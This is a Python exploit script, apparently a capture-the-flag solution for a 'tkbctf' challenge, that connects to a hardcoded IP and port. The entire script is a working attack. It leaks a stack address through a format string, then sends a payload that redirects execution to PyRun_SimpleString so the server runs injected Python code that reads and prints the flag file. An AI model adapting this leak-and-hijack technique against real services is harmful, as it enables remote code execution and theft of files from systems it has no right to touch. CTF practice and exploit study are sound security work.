#!/usr/bin/env python3
import ast
import re
import socket
import struct
import sys


HOST = "35.194.108.145"
PORT = 13840
PYRUN_SIMPLESTRING = 0x4B5892
LEAK_INDEX = 17
RSP_DELTA = 0xC8


def recv_line(sock: socket.socket) -> bytes:
    data = bytearray()
    while True:
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
        if chunk == b"\n":
            break
    return bytes(data)


def leak_rsp(sock: socket.socket) -> int:
    leak_fmt = "(" + "K" * 32 + ")\n"
    sock.sendall(leak_fmt.encode())
    line = recv_line(sock)
    values = ast.literal_eval(line.decode().strip())
    return values[LEAK_INDEX] - RSP_DELTA


def build_payload(rsp: int) -> bytes:
    command = b"import glob;print(open(glob.glob('flag*')[0]).read())\x00"
    cmd_ptr = rsp + 32
    payload = b"KKKKKKKO&\x00AAAAAA"
    payload += struct.pack("<Q", PYRUN_SIMPLESTRING)
    payload += struct.pack("<Q", cmd_ptr)
    payload += command
    payload += b"\n"
    return payload


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT

    with socket.create_connection((host, port), timeout=10) as sock:
        banner = recv_line(sock)
        sys.stdout.buffer.write(banner)

        rsp = leak_rsp(sock)
        print(f"[+] rsp = {rsp:#x}")

        sock.sendall(build_payload(rsp))

        output = bytearray()
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            output += chunk

    text = output.decode("latin1", "replace")
    sys.stdout.write(text)

    match = re.search(r"tkbctf\{[^\n\r}]+\}", text)
    if match:
        print(f"[+] flag = {match.group(0)}")
        return 0

    print("[-] flag not found", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
